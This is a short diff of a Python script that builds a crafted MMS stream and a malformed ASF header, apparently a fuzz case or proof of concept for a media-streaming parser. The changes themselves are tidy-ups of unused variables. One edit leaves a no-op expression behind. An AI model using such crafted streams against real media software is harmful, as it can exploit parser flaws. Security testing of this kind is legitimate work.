@@ -70,8 +70,7 @@ def build_mms_command(command_id: int, transaction_id: int,
     # Then payload
 
     direction = 0x0004  # Server -> Client
-    command_dir_low = command_id & 0xFFFF
-    command_dir_high = direction
+    command_id & 0xFFFF
 
     header = struct.pack("<II", 0xB00BFACE, 0x00000001)  # signature
 
@@ -113,7 +112,6 @@ def build_crafted_asf_header() -> bytes:
     packet_size = 8
 
     # Build File Properties object
-    file_props = ASF_FILE_PROPERTIES_GUID
     file_id = b"\x00" * 16  # File ID GUID
     file_size = struct.pack("<Q", 0x1000)  # Fake file size
     creation_date = struct.pack("<Q", 0)
@@ -354,7 +352,7 @@ def main():
     args = parser.parse_args()
 
     # Generate the crafted MMS stream
-    print(f"[craft_mms] Building crafted MMS stream...")
+    print("[craft_mms] Building crafted MMS stream...")
     mms_data = build_crafted_mms_stream()
     print(f"[craft_mms] Generated {len(mms_data)} bytes of crafted MMS data")
 
